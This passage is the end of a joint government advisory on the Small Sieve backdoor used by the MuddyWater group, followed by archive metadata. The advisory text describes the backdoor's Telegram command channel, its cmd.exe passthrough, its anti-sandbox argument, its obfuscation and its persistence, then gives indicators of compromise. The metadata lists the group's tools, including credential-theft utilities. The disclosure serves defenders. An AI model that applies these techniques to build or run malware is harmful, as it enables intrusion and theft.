NSA\n\nTLP:WHITE\nchange token””newtoken\n\nThe backdoor will reconnect to the Telegram Bot\nAPI using the provided token newtoken. This\nupdated token will be stored in the encoded\nMicrosoftWindowsOutlookDataPlus.txt file.\n\ndisconnect\n\nThe original connection to Telegram is terminated.\nIt is likely used after a change token command is\nissued.\n\nAny commands other than those detailed in table 5 are executed directly by passing them to cmd.exe\n/c, and the output is returned as a reply.\n\nDefense Evasion\nAnti-Sandbox\n\nFigure 1: Execution Guardrail\nThreat actors may be attempting to thwart simple analysis by not passing “Platypus” on the command\nline.\n\nString obfuscation\nInternal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64encoded. A decryption script is included in Appendix B.\n\nCommunications\nBeacon Format\nBefore listening for tasking using CommandHandler objects from the python-telegram-bot module, a\nbeacon is generated manually using the standard requests library:\n\nPage 16 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nFigure 2: Manually Generated Beacon\nThe hex host data is encoded using the byte shuffling algorithm as described in the “Communications\n(Traffic obfuscation)” section of this report. The example in figure 2 decodes to:\nadmin/WINDOMAIN1 | 10.17.32.18\n\nTraffic obfuscation\nAlthough traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and\nresponse using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3.\n\nFigure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling\n\nDetection\nTable 6 outlines indicators of compromise.\nTable 6: Indicators of Compromise\nType\nPath\n\nDescription\nTelegram Session\nPersistence File\n(Obfuscated)\n\nValues\n%LocalAppData%\\MicrosoftWindowsOut\nlookDataPlus.txt\n\nPath\n\nInstallation path of the\nSmall Sieve binary\n\n%AppData%\\OutlookMicrosift\\index.e\nxe\n\nPage 17 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nRegistry value name\n\nPersistence Registry Key\npointing to index.exe with\na “Platypus” argument\n\nHKCU\\Software\\Microsoft\\Windows\\Cu\nrrentVersion\\Run\\OutlookMicrosift\n\nString Recover Script\n\nFigure 4: String Recovery Script\n\nPage 18 of 18 | Product ID: AA22-055A\n\nTLP: WHITE",
    "language": "EN",
    "sources": [
        {
            "id": "4e039bf8-7239-4999-8ec0-eb202d1465af",
            "created_at": "2022-12-04T11:19:36.52593Z",
            "updated_at": "2022-12-04T11:19:36.52593Z",
            "deleted_at": null,
            "name": "ORKL",
            "url": "https://github.com/ORKL/library",
            "description": "ORKL Community Contributed Content",
            "reports": null
        }
    ],
    "references": [
        "https://media.defense.gov/2022/Feb/24/2002944274/-1/-1/0/CSA_AA22-055A_Iranian_Government-Sponsored_Actors_Conduct_Cyber_Operations.PDF"
    ],
    "report_names": [
        "CSA_AA22-055A_Iranian_Government-Sponsored_Actors_Conduct_Cyber_Operations.PDF"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1672160774,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1645699853,
    "ts_modification_date": 1645699853,
    "files": {
        "pdf": "https://archive.orkl.eu/bbaa3bedd6dbd015e34999102e2216999c6c6348.pdf",
        "text": "https://archive.orkl.eu/bbaa3bedd6dbd015e34999102e2216999c6c6348.txt",
        "img": "https://archive.orkl.eu/bbaa3bedd6dbd015e34999102e2216999c6c6348.jpg"
    }
}